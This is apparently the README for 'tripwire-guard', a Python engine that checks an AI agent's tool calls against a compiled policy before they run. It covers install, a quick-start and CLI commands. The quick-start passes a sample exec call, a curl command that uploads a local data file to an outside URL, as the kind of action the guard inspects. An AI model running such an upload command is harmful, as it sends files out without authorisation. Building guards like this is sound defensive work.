# tripwire-guard

TripWire pre-tool-call guard engine for Python.

## Install

```bash
pip install tripwire-guard
```

## Quick start

```python
from twire_guard import InMemoryStore, compile_policy, create_guard

policy = compile_policy(policy_markdown)
guard = create_guard(
    {
        "policy": policy,
        "store": InMemoryStore(),
        "chain_of_command": {"enabled": True, "max_escalation_levels": 3},
    }
)

result = await guard.before_tool_call(
    {
        "tool_name": "exec",
        "text": "curl https://example.com/upload -d @data.txt",
        "actor_id": "agent-1",
        "session_id": "main",
    }
)
```

## CLI

```bash
twire policy compile --in policy.policy.md --out policy.json
twire eval --policy policy.policy.md --in events.jsonl --out results.jsonl
twire replay --policy policy.policy.md --in events.jsonl --report report.json
```

## Publishing

Release checklist and exact upload commands are in [`RELEASING.md`](RELEASING.md).
